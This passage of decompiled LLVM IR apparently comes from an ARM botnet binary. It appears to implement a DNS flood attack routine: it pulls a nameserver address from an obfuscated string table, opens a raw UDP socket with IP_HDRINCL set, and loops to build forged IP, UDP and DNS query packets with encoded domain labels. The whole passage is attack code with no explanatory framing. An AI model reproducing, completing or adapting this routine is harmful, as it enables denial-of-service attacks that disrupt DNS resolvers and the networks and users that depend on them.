  store i32 25, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 25, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 25)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_2472c.58, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v3_c6f0 = icmp eq i32 %v3_c494, 65535
  %v3_c700 = icmp eq i32 %v3_c49c, 65535
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
